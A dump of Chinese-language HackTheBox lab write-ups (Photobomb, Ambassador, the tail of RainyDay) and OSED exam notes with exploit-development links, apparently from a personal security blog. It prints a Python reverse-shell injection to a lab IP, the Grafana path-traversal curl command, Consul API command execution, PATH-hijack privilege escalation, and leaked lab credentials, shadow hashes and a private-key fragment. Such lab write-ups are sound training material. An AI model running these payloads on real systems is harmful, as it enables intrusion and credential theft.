qXL3BZKAlGBQBgA&#x2F;kWzU1XAsT+5pryLONZq&#x2F;K+8xuQRlfAt7h2lbsSXDAAAAwQDravvp+1aMbCpdCniJZTG6rZ&#x2F;wIjxoCz9n9ErjcpMFUJwTKulbbrc79vA3Id4unTO8cuylOMgFlUCpKr9v2GeoMIeoLntX91mM1U+3m9v2Vcad36DpoqEZc0XWupuypRjqIZy0aO1insvD985C0z00eL6GYbibjTdNT90C&#x2F;ew2r4ZUg0hHlWENPwufIajaQylDoQ6xsXkU7a7Py+Sq5UWE7LzwxYqlOyDZfjSroXYhy5P+0KP+flNzL6B2X8MLQ8cAAAANcm9vdEByYWlueWRheQECAwQFBg&#x3D;&#x3D;-----END OPENSSH PRIVATE KEY----- 参考资料 The Craziest Python Sandbox Escape | Reelix’s Site of Stuffhttps://www.reelix.za.net/2021/04/the-craziest-python-sandbox-escape.html RainyDay - HTB [Discussion] | BreachForumshttps://breached.to/Thread-RainyDay-HTB-Discussion HackTheBox (HTB) Writeup: RainyDay [Hard] – meowmeowattackhttps://meowmeowattack.wordpress.com/2022/10/18/hackthebox-htb-writeup-rainyday/","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Photobomb - HackTheBox","slug":"Photobomb-HackTheBox","date":"2022-10-12T05:11:06.000Z","updated":"2023-02-13T01:19:55.954Z","comments":true,"path":"2022/10/12/Photobomb-HackTheBox/","link":"","permalink":"https://darkwing.moe/2022/10/12/Photobomb-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.com/home/machines/profile/500 10.10.11.182 端口扫描22,80: 123456789101112131415$ nmap -sC -sV -Pn 10.10.11.182Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-12 10:25 CSTNmap scan report for 10.10.11.182Host is up (0.21s latency).Not shown: 998 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 3072 e22473bbfbdf5cb520b66876748ab58d (RSA)| 256 04e3ac6e184e1b7effac4fe39dd21bae (ECDSA)|_ 256 20e05d8cba71f08c3a1819f24011d29e (ED25519)80/tcp open http nginx 1.18.0 (Ubuntu)|_http-server-header: nginx/1.18.0 (Ubuntu)|_http-title: Did not follow redirect to http://photobomb.htb/Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 80需要加hosts 110.10.11.182 photobomb.htb photobomb.htb页面JS中可以得到账号密码： 1pH0t0 : b0Mb! 登录进去可以看到很多图片： 命令注入有一个下载图片用于打印的功能，filetype参数注入： 1photo&#x3D;voicu-apostol-MWER49YaD-M-unsplash.jpg&amp;filetype&#x3D;jpg;python3%20-c%20&#39;import%20socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.10.14.4%22,4444));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import%20pty;%20pty.spawn(%22&#x2F;bin&#x2F;bash%22)&#39;&amp;dimensions&#x3D;3000x2000 user flag得到的shell就是user： 提权信息查看sudo，发现可运行的一个sh文件中，cp和find命令没有使用绝对路径： 所以就是普通的环境变量劫持： Linux Privilege Escalation - HackTrickshttps://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-command-suid-binary-without-command-path 提权 &amp; root flag可以先写个公钥ssh进去方便操作,因为cd是built-in command，所以需要劫持find才会生效(一个小细节)： 123cd /tmpecho \"chmod +s /bin/bash\" &gt; /tmp/findsudo PATH=/tmp:$PATH /opt/cleanup.sh shadow12root:$6$7MU2U.CeiY0WX91P$TUNn8zNu&#x2F;XUPSgURRJbzYvnnawpZdGhsWiLSpVrm1cIx9Rev7V&#x2F;yQ5x58gTy98zcXrv6RqlWRtXcbhEhTl3240:19251:0:99999:7:::wizard:$6$qmjmqNE6eDSugXXx$KSXyEnRqlVcnAOT9iqxGRsrwnakYHAlF8mNMpEE75i3ZHA0T23OVnedmK3rbaw2gMFbLekluAtgByD&#x2F;mySzsy1:19077:0:99999:7::: 参考资料 Linux Privilege Escalation - HackTrickshttps://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-command-suid-binary-without-command-path Photobomb - HTB [Discussion] | BreachForumshttps://breached.to/Thread-Photobomb-HTB-Discussion HackTheBox (HTB) Writeup: Photobomb [Easy] – meowmeowattackhttps://meowmeowattack.wordpress.com/2022/10/09/hackthebox-htb-writeup-photobomb/ Hackthebox Photobomb Writeup | 0xDedinfosec Bloghttps://0xdedinfosec.vercel.app/post/hackthebox-photobomb-writeup","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Ambassador - HackTheBox","slug":"Ambassador-HackTheBox","date":"2022-10-09T02:57:21.000Z","updated":"2023-01-29T02:29:08.166Z","comments":true,"path":"2022/10/09/Ambassador-HackTheBox/","link":"","permalink":"https://darkwing.moe/2022/10/09/Ambassador-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.com/home/machines/profile/499 10.10.11.183 端口扫描22,80,3000,3306: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293$ nmap -sC -sV -Pn 10.10.11.183Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-09 09:54 CSTNmap scan report for 10.10.11.183Host is up (0.23s latency).Not shown: 996 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 3072 29dd8ed7171e8e3090873cc651007c75 (RSA)| 256 80a4c52e9ab1ecda276439a408973bef (ECDSA)|_ 256 f590ba7ded55cb7007f2bbc891931bf6 (ED25519)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: Ambassador Development Server|_http-generator: Hugo 0.94.23000/tcp open ppp?| fingerprint-strings:| GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie:| HTTP/1.1 400 Bad Request| Content-Type: text/plain; charset=utf-8| Connection: close| Request| GetRequest:| HTTP/1.0 302 Found| Cache-Control: no-cache| Content-Type: text/html; charset=utf-8| Expires: -1| Location: /login| Pragma: no-cache| Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax| X-Content-Type-Options: nosniff| X-Frame-Options: deny| X-Xss-Protection: 1; mode=block| Date: Sun, 09 Oct 2022 01:56:08 GMT| Content-Length: 29| href=\"/login\"&gt;Found&lt;/a&gt;.| HTTPOptions:| HTTP/1.0 302 Found| Cache-Control: no-cache| Expires: -1| Location: /login| Pragma: no-cache| Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax| X-Content-Type-Options: nosniff| X-Frame-Options: deny| X-Xss-Protection: 1; mode=block| Date: Sun, 09 Oct 2022 01:56:14 GMT|_ Content-Length: 03306/tcp open mysql MySQL 8.0.30-0ubuntu0.20.04.2| mysql-info:| Protocol: 10| Version: 8.0.30-0ubuntu0.20.04.2| Thread ID: 10| Capabilities flags: 65535| Some Capabilities: SupportsLoadDataLocal, InteractiveClient, ODBCClient, LongPassword, Speaks41ProtocolOld, SupportsCompression, DontAllowDatabaseTableColumn, SwitchToSSLAfterHandshake, LongColumnFlag, Speaks41ProtocolNew, IgnoreSigpipes, Support41Auth, SupportsTransactions, IgnoreSpaceBeforeParenthesis, FoundRows, ConnectWithDatabase, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins| Status: Autocommit| Salt: J:BgUq\\x0C.((lQ\\x13N*,#p 7|_ Auth Plugin Name: caching_sha2_password1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port3000-TCP:V=7.93%I=7%D=10/9%Time=63422A37%P=x86_64-apple-darwin21.5.SF:0%r(GenericLines,67,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-TypeSF::\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x2SF:0Bad\\x20Request\")%r(GetRequest,174,\"HTTP/1\\.0\\x20302\\x20Found\\r\\nCache-SF:Control:\\x20no-cache\\r\\nContent-Type:\\x20text/html;\\x20charset=utf-8\\r\\SF:nExpires:\\x20-1\\r\\nLocation:\\x20/login\\r\\nPragma:\\x20no-cache\\r\\nSet-CoSF:okie:\\x20redirect_to=%2F;\\x20Path=/;\\x20HttpOnly;\\x20SameSite=Lax\\r\\nX-SF:Content-Type-Options:\\x20nosniff\\r\\nX-Frame-Options:\\x20deny\\r\\nX-Xss-PSF:rotection:\\x201;\\x20mode=block\\r\\nDate:\\x20Sun,\\x2009\\x20Oct\\x202022\\x2SF:001:56:08\\x20GMT\\r\\nContent-Length:\\x2029\\r\\n\\r\\n&lt;a\\x20href=\\\"/login\\\"&gt;SF:Found&lt;/a&gt;\\.\\n\\n\")%r(Help,67,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContSF:ent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\rSF:\\n400\\x20Bad\\x20Request\")%r(HTTPOptions,12E,\"HTTP/1\\.0\\x20302\\x20Found\\SF:r\\nCache-Control:\\x20no-cache\\r\\nExpires:\\x20-1\\r\\nLocation:\\x20/login\\SF:r\\nPragma:\\x20no-cache\\r\\nSet-Cookie:\\x20redirect_to=%2F;\\x20Path=/;\\x2SF:0HttpOnly;\\x20SameSite=Lax\\r\\nX-Content-Type-Options:\\x20nosniff\\r\\nX-FSF:rame-Options:\\x20deny\\r\\nX-Xss-Protection:\\x201;\\x20mode=block\\r\\nDate:SF:\\x20Sun,\\x2009\\x20Oct\\x202022\\x2001:56:14\\x20GMT\\r\\nContent-Length:\\x20SF:0\\r\\n\\r\\n\")%r(RTSPRequest,67,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConSF:tent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\SF:r\\n400\\x20Bad\\x20Request\")%r(SSLSessionReq,67,\"HTTP/1\\.1\\x20400\\x20Bad\\SF:x20Request\\r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nConnectiSF:on:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Request\")%r(TerminalServerCookie,67,\"SF:HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/plain;\\x20cSF:harset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Request\")%r(TSF:LSSessionReq,67,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x2SF:0text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20BadSF:\\x20Request\")%r(Kerberos,67,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContSF:ent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\rSF:\\n400\\x20Bad\\x20Request\");Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 193.84 seconds 80一个博客，直接说了devops获取密码： 3000Grafana v8.2.0： Grafana-CVE-2021-43798很容易搜到这个相关漏洞： Grafana 8.3.0 - Directory Traversal and Arbitrary File Read - CVE-2021-43798 | VK9 Securityhttps://vk9-sec.com/grafana-8-3-0-directory-traversal-and-arbitrary-file-read-cve-2021-43798/ jas502n/Grafana-CVE-2021-43798: Grafana Unauthorized arbitrary file reading vulnerabilityhttps://github.com/jas502n/Grafana-CVE-2021-43798 /etc/grafana/grafana.ini直接读取grafana配置文件，得到grafana admin密码,并且可以看到secret被注释掉了： 1234admin_password &#x3D; messageInABottle685427# used for signing;secret_key &#x3D; SW2YcwTIb9zpOOhoPsMm /var/lib/grafana/grafana.dbgrafana.db也可以下载下来，这个没启用加密，直接查看即可： 1234567curl --path-as-is http://10.10.11.183:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db -o grafana.dbsqlite3 grafana.dbsqlite&gt; .tablessqlite&gt; select * from data_source;2|1|1|mysql|mysql.yaml|proxy||dontStandSoCloseToMe63221!|grafana|grafana|0|||0|&#123;&#125;|2022-09-01 22:43:03|2022-10-09 01:49:40|0|&#123;&#125;|1|uKewFgM4z mysql使用得到的账号密码连接mysql查看信息，获取到developer用户密码： 12345678910111213mycli -h 10.10.11.183 -u grafana -pdontStandSoCloseToMe63221!show databases;use whackywidget;show tables;+-----------+------------------------------------------+| user | pass |+-----------+------------------------------------------+| developer | YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg== |+-----------+------------------------------------------+$ echo \"YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg==\" | base64 -danEnglishManInNewYork027468 user flagdeveloper用户ssh登录，得到user flag: 提权信息/opt/my-app目录下，查看git历史，可以得到一个consul token： 1234developer@ambassador:/opt/my-app$ git show...-consul kv put --token bb03b43b-1d81-d62b-24b5-39540ee469b5 whackywidget/db/mysql_pw $MYSQL_PASSWORD... 另外可以搜索到consul相关漏洞： Hashicorp Consul Remote Command Execution via Services API - Metasploit - InfosecMatterhttps://www.infosecmatter.com/metasploit-module-library/?mm=exploit/multi/misc/consul_service_exec metasploit-framework/consul_service_exec.rb at master · rapid7/metasploit-frameworkhttps://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/misc/consul_service_exec.rb 提权 &amp; root flag根据msf模块代码构造curl命令调用api，执行任意命令。例如执行一个给bash加suid的sh文件： (也可以把8500端口转发出来，然后直接用msf打) 12345echo 'chmod +s /usr/bin/bash' &gt; /tmp/e.shcurl --header \"X-Consul-Token: bb03b43b-1d81-d62b-24b5-39540ee469b5\" --request PUT -d '&#123;\"ID\": \"miao\", \"Name\": \"miao\", \"Address\": \"127.0.0.1\", \"Port\": 80, \"check\": &#123;\"Args\": [\"/usr/bin/bash\", \"/tmp/e.sh\"], \"interval\": \"10s\", \"timeout\": \"1s\"&#125;&#125;' http://127.0.0.1:8500/v1/agent/service/register/usr/bin/bash -p shadow12root:$6$AY&#x2F;Hqk&#x2F;PJgettbhs$mgg2hluJ8.leTpnrlEkh4RF7qE6Ns9j&#x2F;TtV3Sx5OIsZ2YEA0OjGsJpmQlX2CFMmbwNjmvCZy9&#x2F;Rcea4nF799V0:19065:0:99999:7:::developer:$6$Qn1mw&#x2F;0Al3UAi&#x2F;qx$sBdXWTZE22UeJPw1iTYMb69LNMGbk9eZYj7o1H55rE9QB.t47TB6pOoOTf4ZfVSngS3aSK.CpANtRUM1hcAiG&#x2F;:19237:0:99999:7::: 参考资料 Grafana 8.3.0 - Directory Traversal and Arbitrary File Read - CVE-2021-43798 | VK9 Securityhttps://vk9-sec.com/grafana-8-3-0-directory-traversal-and-arbitrary-file-read-cve-2021-43798/ jas502n/Grafana-CVE-2021-43798: Grafana Unauthorized arbitrary file reading vulnerabilityhttps://github.com/jas502n/Grafana-CVE-2021-43798 Hashicorp Consul Remote Command Execution via Services API - Metasploit - InfosecMatterhttps://www.infosecmatter.com/metasploit-module-library/?mm=exploit/multi/misc/consul_service_exec metasploit-framework/consul_service_exec.rb at master · rapid7/metasploit-frameworkhttps://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/misc/consul_service_exec.rb Ambassador - HTB [Discussion] | BreachForumshttps://breached.to/Thread-Ambassador-HTB-Discussion HackTheBox (HTB) Writeup: Ambassador [Medium] – meowmeowattackhttps://meowmeowattack.wordpress.com/2022/10/03/hackthebox-htb-writeup-ambassador-medium/","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"OSED受験記","slug":"OSED受験記","date":"2022-10-07T11:49:41.000Z","updated":"2022-10-08T07:34:20.016Z","comments":true,"path":"2022/10/07/OSED受験記/","link":"","permalink":"https://darkwing.moe/2022/10/07/OSED%E5%8F%97%E9%A8%93%E8%A8%98/","excerpt":"","text":"准备主要就是课程资料和lab练习，额外练习资源在后面参考资料中 考试尽可能多练习熟悉各种坑，我是只做完了课程中的内容，课后作业都没做完，三个challenge也是只大概看了下，一个都没做 考试内容具体太细节的不能说，只写大概内容 三个题目 给有基础 crash poc，DEP绕过 30分 custome shellcode 30分 逆向 ，DEP + ASLR 绕过 40分 满分100分，60分及格，没有步骤分，所以必须要完全做出来两个题目 DEP bypass题目题目会有很明确的限制，比如要求你必须使用某个函数进行 并且过滤完badchars后可用gadgets也很少 然后shellcode部分也会坑，badchars比较多，如果继续使用rop编码解码处理badchars的话，剩余空间不够，只能使用自定义shellcode，修改一些会产生badchars的指令，生成可用shellcode custome shellcode这部分就是纯汇编代码实现题目要求，考试很明确的要求了需要调用什么函数达成什么效果， 测试效果就是python keystone-engine + windbg 最关键的就是要注意position independent code 和 NULL-Free, 生成的shellcode如果有null byte，用python运行是没问题的，然而，在真正的漏洞利用中使用这个 shellcode 会有问题，因为 NULL 字节通常是一个坏字符 所以需要满足这些基本要求，生成的操作码不能有null字节，这个自己windbg一点点确认，然后修改对应汇编指令为没有null byte，但效果相同的其他指令即可 逆向题目根据考试说明是需要逆向找到绕过ASLR的方式，然后还有内存漏洞控制eip，以及后续的DEP绕过部分，但考试的逆向只允许使用IDA免费版本，不允许使用IDA Pro，Ghidra之类的其他工具 这个题目就大概看了下，直接放弃了 通用武器化是基本要求，靶机操作系统环境版本可能和调试机不一样，所以gadget只能使用程序本身的，不能使用系统dll中的 最重要的就是OffSec一直要求的 TryHarder .我是因为完全没有任何额外练习，考试中各种浪费时间，不止一次想跟监考说放弃考试，但继续坚持，都会在几个小时内找到突破口 参考资料学习 &amp; 练习资源 nop-tech/OSED: Containing my notes, practice binaries + solutions, blog posts, etc. for the Offensive Security Exploit Developer (OSED/EXP-301)https://github.com/nop-tech/OSED/ PAWNYABLE!https://pawnyable.cafe/ Learning Linux kernel exploitation - Part 1 - Laying the groundworkhttps://0x434b.dev/dabbling-with-linux-kernel-exploitation-ctf-challenges-to-learn-the-ropes/amp/ 深入理解进程线程 - 跳跳糖https://tttang.com/archive/1483/ m33s33ks/WUMED-OSED: Notes template for Offensive Security’s EXP-301 course and OSED exam (笔记模板)https://github.com/m33s33ks/WUMED-OSED scripts ricardojoserf/OSED-prep: Exploits written while preparing for the OSED examhttps://github.com/ricardojoserf/OSED-prep ommadawn46/win-x86-shellcoder: A tool to help find bad chars in shellcode and develop shellcode without bad chars, created to assist myself in OSED course.https://github.com/ommadawn46/win-x86-shellcoder epi052/osed-scripts: bespoke tooling for offensive security’s Windows Usermode Exploit Dev course (OSED)https://github.com/epi052/osed-scripts osed-tools/filter-ropfile.py at main · 0xbad53c/osed-toolshttps://github.com/0xbad53c/osed-tools DEP bypass Bypassing DEP with WriteProcessMemory (x86) • Vulndevhttps://vulndev.io/2022/06/12/bypassing-dep-with-writeprocessmemory/ Bypassing DEP with VirtualProtect (x86) • Vulndevhttps://vulndev.io/2022/06/14/bypassing-dep-with-virtualalloc-x86/ Exploit Development: Hands Up! Give Us the Stack! This Is a ROPpery! | Homehttps://connormcgarr.github.io/ROP/ Exploit Development: Playing ROP’em COP’em Robots with WriteProcessMemory() | Homehttps://connormcgarr.github.io/ROP2/ Creating Win32 ROP Chains - The Human Machine Interfacehttps://h0mbre.github.io/Creating_Win32_ROP_Chains/ Vulnserver TRUN Bypass DEP With ROP | Technical Memorandumhttps://n0maj1o24.github.io/2022/02/22/Vulnserver-TRUN-Bypass-DEP-With-ROP/ Vulnserver TRUN Bypass DEP With ROP Again | Technical Memorandumhttps://n0maj1o24.github.io/2022/02/24/Vulnserver-TRUN-Bypass-DEP-With-ROP-Again/ Vulnserver TRUN Bypass DEP With ROP On Win10 | Technical Memorandumhttps://n0maj1o24.github.io/2022/05/01/Vulnserver-TRUN-Bypass-DEP-With-ROP-On-Win10/ Vulnserver TRUN Bypass DEP With ROP On Win10 II | Technical Memorandumhttps://n0maj1o24.github.io/2022/05/30/Vulnserver-TRUN-Bypass-DEP-With-ROP-On-Win10-II/ shellcode Windows下Shellcode编写详解 - 先知社区https://xz.aliyun.com/t/2108 shellcode编写之动态定位API - 先知社区https://xz.aliyun.com/t/10490 Baby’s First Win32 Shellcode - The Human Machine Interfacehttps://h0mbre.github.io/Babys-First-Shellcode/ Baby’s First Win32 Shellcode Part 2 - The Human Machine Interfacehttps://h0mbre.github.io/Babys-First-Shellcode-Part2/ Win32 Reverse Shell Shellcode - The Human Machine Interfacehttps://h0mbre.github.io/Win32_Reverse_Shellcode/ Create A Simple Windows Shellcode | Technical Memorandumhttps://n0maj1o24.github.io/2022/03/11/Create-A-Simple-Windows-Shellcode/ 奇安信攻防社区-Window向之x86 ShellCode入门https://forum.butian.net/share/1244 Writing Small (reverse) Shell Code - Sekurohttps://sekuro.io/blog/writing-small-reverse-shellcode/ syscall A Syscall Journey in the Windows Kernel - Alice Climent-Pommerethttps://alice.climent-pommeret.red/posts/a-syscall-journey-in-the-windows-kernel/ syscall的前世今生 - 跳跳糖https://tttang.com/archive/1464/ fmtstr 在Windows下利用格式字符串 - 先知社区https://xz.aliyun.com/t/2410 Exploiting Format Strings in Windows | 🔐Blog of Osandahttps://osandamalith.com/2018/02/01/exploiting-format-strings-in-windows/ SLAE Assignment这个是针对SecurityTube Linux Assembly Expert的学习资料，学习汇编代码编写shellcode的方法比较有用： SLAE Assignment 1 – TCP Bind Shell - The Human Machine Interfacehttps://h0mbre.github.io/SLAE_TCP_Bind_Shell/ SLAE Assignment 2 – TCP Reverse Shell - The Human Machine Interfacehttps://h0mbre.github.io/SLAE_TCP_Rev_Shell/ SLAE Assignment 3 – Egg Hunter - The Human Machine Interfacehttps://h0mbre.github.io/SLAE_Egg_Hunter/ SLAE Assignment 4 – Encoder - The Human Machine Interfacehttps://h0mbre.github.io/SLAE_Encoder/ SLAE Assignment 5 – MSF Analysis - The Human Machine Interfacehttps://h0mbre.github.io/SLAE_MSF_Analysis/ SLAE Assignment 6 – Polymorphic Shellcode - The Human Machine Interfacehttps://h0mbre.github.io/SLAE_Polymorphic_Shellcode/ SLAE Assignment 7 – Custom Crypter - The Human Machine Interfacehttps://h0mbre.github.io/SLAE_Crypter/ SLAE x86 Review - The Human Machine Interfacehttps://h0mbre.github.io/SLAE_x86_Review/ CTP/OSCE Prep和上面的SLAE Assignment 系列同一个作者： CTP/OSCE Prep – Boofuzzing Vulnserver for EIP Overwrite - The Human Machine Interfacehttps://h0mbre.github.io/Boofuzz_to_EIP_Overwrite/ CTP/OSCE Prep – ‘GMON’ SEH Based Overflow in Vulnserver - The Human Machine Interfacehttps://h0mbre.github.io/SEH_Based_Exploit/ CTP/OSCE Prep – ‘GMON’ Egghunter Exploit in Vulnserver - The Human Machine Interfacehttps://h0mbre.github.io/Egghunter_GMON_Vulnserver/ CTP/OSCE Prep – ‘GMON’ Egghunter With Character Restrictions - The Human Machine Interfacehttps://h0mbre.github.io/Badchars_Egghunter_SEH_Exploit/ CTP/OSCE Prep – ‘LTER’ SEH Snafu! and EIP Overwrite Success - The Human Machine Interfacehttps://h0mbre.github.io/LTER_SEH_Exploit/ CTP/OSCE Prep – A Noob’s Approach to Alphanumeric Shellcode (LTER SEH Overwrite) - The Human Machine Interfacehttps://h0mbre.github.io/LTER_SEH_Success/ CTP/OSCE Prep – ‘LTER’ SEH Overwrite v2.0! - The Human Machine Interfacehttps://h0mbre.github.io/LTER_SEH_Overwrite_2/ CTP/OSCE Prep – ‘HTER’ EIP Overwrite with a Twist - The Human Machine Interfacehttps://h0mbre.github.io/HTER_EIP_Twist/ CTP/OSCE Prep – Offset Helper for CTP - The Human Machine Interfacehttps://h0mbre.github.io/Offset/ CTP/OSCE Prep – Easy File Sharing Web Server 7.2 SEH Overwrite - The Human Machine Interfacehttps://h0mbre.github.io/Easy_File_Sharing_Web_Server/ CTP/OSCE Prep – Xitami Webserver 2.5 SEH Overflow With Egghunter - The Human Machine Interfacehttps://h0mbre.github.io/Xitami_Webserver_SEH/ CTP/OSCE Prep – Wrapping Up Our Prep - The Human Machine Interfacehttps://h0mbre.github.io/CTP_Summary/ OSCE Exam Practiceepi的一个系列教程，标题是老的OSCE，但对现在的OSED仍然很有用： OSCE Exam Practice - Part I (Lab Setup)https://epi052.gitlab.io/notes-to-self/blog/2020-05-13-osce-exam-practice-part-one/ OSCE Exam Practice - Part II (TRUN via EIP Overwrite)https://epi052.gitlab.io/notes-to-self/blog/2020-05-14-osce-exam-practice-part-two/ OSCE Exam Practice - Part III (GMON via SEH Overwrite w/ Egg Hunter)https://epi052.gitlab.io/notes-to-self/blog/2020-05-18-osce-exam-practice-part-three/ OSCE Exam Practice - Part IV (GMON via SEH Overwrite w/ Stack Pivot)https://epi052.gitlab.io/notes-to-self/blog/2020-05-19-osce-exam-practice-part-four/ OSCE Exam Practice - Part V (KSTET via 3-stage Shellcode)https://epi052.gitlab.io/notes-to-self/blog/2020-05-19-osce-exam-practice-part-five/ ( 两个socket，一个执行egghunter，另一个发送shellcode) OSCE Exam Practice - Part VI (HTER via EIP Overwrite w/ Restricted Character Set)https://epi052.gitlab.io/notes-to-self/blog/2020-05-21-osce-exam-practice-part-six/ （只有ascii 0-f/F 字符的payload） OSCE Exam Practice - Part VII (GTER via EIP Overwrite w/ Socket Reuse Payload)https://epi052.gitlab.io/notes-to-self/blog/2020-05-22-osce-exam-practice-part-seven/ (socket reuse) OSCE Exam Practice - Part VIII (LTER via EIP Overwrite w/ Restricted Character Set)https://epi052.gitlab.io/notes-to-self/blog/2020-05-24-osce-exam-practice-part-eight/ （受限字符集，只使用ascii的payload） OSCE Exam Practice - Part IX (LTER via SEH Overwrite w/ Restricted Character Set)https://epi052.gitlab.io/notes-to-self/blog/2020-05-25-osce-exam-practice-part-nine/ （受限字符集，只使用ascii的payload，复杂的编码处理） Zero Day Zen Garden: Windows Exploit Development Zero Day Zen Garden: Windows Exploit Development - Part 0 [Dev Setup &amp; Advice] | Shogun Lab 将軍ラボhttps://www.shogunlab.com/blog/2017/08/11/zdzg-windows-exploit-0.html Zero Day Zen Garden: Windows Exploit Development - Part 1 [Stack Buffer Overflow Intro] | Shogun Lab 将軍ラボhttps://www.shogunlab.com/blog/2017/08/19/zdzg-windows-exploit-1.html Zero Day Zen Garden: Windows Exploit Development - Part 2 [JMP to Locate Shellcode] | Shogun Lab 将軍ラボhttps://www.shogunlab.com/blog/2017/08/26/zdzg-windows-exploit-2.html Zero Day Zen Garden: Windows Exploit Development - Part 3 [Egghunter to Locate Shellcode] | Shogun Lab 将軍ラボhttps://www.shogunlab.com/blog/2017/09/02/zdzg-windows-exploit-3.html Zero Day Zen Garden: Windows Exploit Development - Part 4 [Overwriting SEH with Buffer Overflows] | Shogun Lab 将軍ラボhttps://www.shogunlab.com/blog/2017/11/06/zdzg-windows-exploit-4.html Zero Day Zen Garden: Windows Exploit Development - Part 5 [Return Oriented Programming Chains] | Shogun Lab 将軍ラボhttps://www.shogunlab.com/blog/2018/02/11/zdzg-windows-exploit-5.html FuzzySecurity | ExploitDev后面还有heap和kernel内容，对于OSED来说看到第7篇就够了 FuzzySecurity | ExploitDev: Part 1: Introduction to Exploit Developmenthttp://www.fuzzysecurity.com/tutorials/expDev/1.html FuzzySecurity | ExploitDev: Part 2: Saved Return Pointer Overflowshttp://www.fuzzysecurity.com/tutorials/expDev/2.html FuzzySecurity | ExploitDev: Part 3: Structured Exception Handler (SEH) http://www.fuzzysecurity.com/tutorials/expDev/3.html FuzzySecurity | ExploitDev: Part 4: Egg Huntershttp://www.fuzzysecurity.com/tutorials/expDev/4.html FuzzySecurity | ExploitDev: Part 5: Unicode 0x00410041http://www.fuzzysecurity.com/tutorials/expDev/5.html (unicode类型的input buffer) FuzzySecurity | ExploitDev: Part 6: Writing W32 shellcodehttp://www.fuzzysecurity.com/tutorials/expDev/6.html FuzzySecurity | ExploitDev: Part 7: Return Oriented Programminghttp://www.fuzzysecurity.com/tutorials/expDev/7.html 后面剩余部分： FuzzySecurity | Tutorialshttp://www.fuzzysecurity.com/tutorials.html Windows Exploit Development by Securitysift Windows Exploit Development - Part 1: The Basics - Security SiftSecurity Sifthttps://www.securitysift.com/windows-exploit-development-part-1-basics/ Windows Exploit Development - Part 2: Intro to Stack Based Overflows - Security SiftSecurity Sifthttps://www.securitysift.com/windows-exploit-development-part-2-intro-stack-overflow/ Windows Exploit Development - Part 3: Changing Offsets and Rebased Modules - Security SiftSecurity Sifthttps://www.securitysift.com/windows-exploit-development-part-3-changing-offsets-and-rebased-modules/ Windows Exploit Development - Part 4: Locating Shellcode With Jumps - Security SiftSecurity Sifthttps://www.securitysift.com/windows-exploit-development-part-4-locating-shellcode-jumps/ Windows Exploit Development – Part 5: Locating Shellcode With Egghunting - Security SiftSecurity Sifthttps://www.securitysift.com/windows-exploit-development-part-5-locating-shellcode-egghunting/ (当内存中有多个匹配egg，其中只有一段shellcode是完整的，但损坏的shellcode先被匹配到，如何解决) Windows Exploit Development – Part 6: SEH Exploits - Security SiftSecurity Sifthttps://www.securitysift.com/windows-exploit-development-part-6-seh-exploits/ Windows Exploit Development - Part 7: Unicode Buffer Overflows - Security SiftSecurity Sifthttps://www.securitysift.com/windows-exploit-development-part-7-unicode-buffer-overflows/ Corelan的系列，每篇都很长 Articles | Corelan Cybersecurity ResearchCorelan Cybersecurity Researchhttps://www.corelan.be/index.php/articles/ 